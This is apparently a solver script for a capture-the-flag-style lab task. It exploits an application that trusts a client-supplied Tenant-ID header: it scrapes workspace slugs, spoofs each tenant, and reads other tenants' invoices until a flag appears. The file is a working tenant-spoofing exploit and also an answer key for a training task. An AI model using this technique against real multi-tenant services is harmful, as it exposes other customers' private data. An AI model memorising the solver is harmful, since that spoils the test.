"""Intended-path solver: header-trusted tenancy leads to a foreign invoice."""

import re

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    detail = "no flag found in any tenant invoice"
    for attempt in range(3):
        page = httpx.get(f"{base}/customers", timeout=10)
        slugs = re.findall(r"<code>([a-z0-9][a-z0-9-]*)</code>", page.text)
        if not slugs:
            detail = f"attempt {attempt}: no workspace slugs on /customers"
            continue
        for slug in slugs:
            listing = httpx.get(f"{base}/invoices", headers={"Tenant-ID": slug}, timeout=10)
            invoice_ids = sorted(set(re.findall(r"INV-\d{4}", listing.text)))
            for invoice_id in invoice_ids:
                res = httpx.get(
                    f"{base}/invoices/{invoice_id}", headers={"Tenant-ID": slug}, timeout=10
                )
                flags = find_flags(res.text)
                if flags:
                    return SolveResult(
                        results=[
                            TaskResult(
                                task_id="cross-tenant-invoice",
                                ok=True,
                                captured=flags[0],
                                detail=f"flag read from {invoice_id} as workspace {slug}",
                            )
                        ]
                    )
            detail = f"attempt {attempt}: no flag across {len(invoice_ids)} invoices of {slug}"
    return SolveResult(
        results=[TaskResult(task_id="cross-tenant-invoice", ok=False, captured=None, detail=detail)]
    )
